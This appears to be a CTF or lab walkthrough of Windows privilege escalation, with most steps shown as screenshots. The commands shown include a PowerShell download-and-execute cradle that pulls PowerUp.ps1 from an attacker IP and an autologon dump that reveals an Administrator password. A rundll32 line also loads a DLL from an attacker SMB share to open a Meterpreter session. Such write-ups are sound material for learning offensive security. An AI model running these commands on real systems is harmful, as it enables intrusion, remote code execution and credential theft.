# 30 - PrivEsc 

```powershell
PS C:\inetpub\wwwroot\internal-01\log> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/PowerUp.ps1')
PS C:\inetpub\wwwroot\internal-01\log> Get-RegistryAutoLogon


DefaultDomainName    : DESKTOP-7I3S68E
DefaultUserName      : Administrator
DefaultPassword      : 3130438f31186fbaf962f407711faddb
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 

PS C:\inetpub\wwwroot\internal-01\log> 
```


# Metasploit
![](vx_images/3038394860356.png)



# Smb_delivery options
![](vx_images/5816682792747.png)

# Run
![](vx_images/3842451609736.png)


# Execute this line of code on the box to connect to meterpreter listener
```powershell
PS C:\inetpub\wwwroot\internal-01\log> rundll32.exe \\10.10.14.12\hGRxjw\test.dll,0
```

# Powershell is connected
![](vx_images/5281694930815.png)

# Go back to the meterpreter session for port forwarding.
![](vx_images/624493423106.png)

# Forward 5985 Windows Remote Management
![](vx_images/4878384160369.png)


# Run evil-winrm and get  a shell
![](vx_images/1856405025383.png)
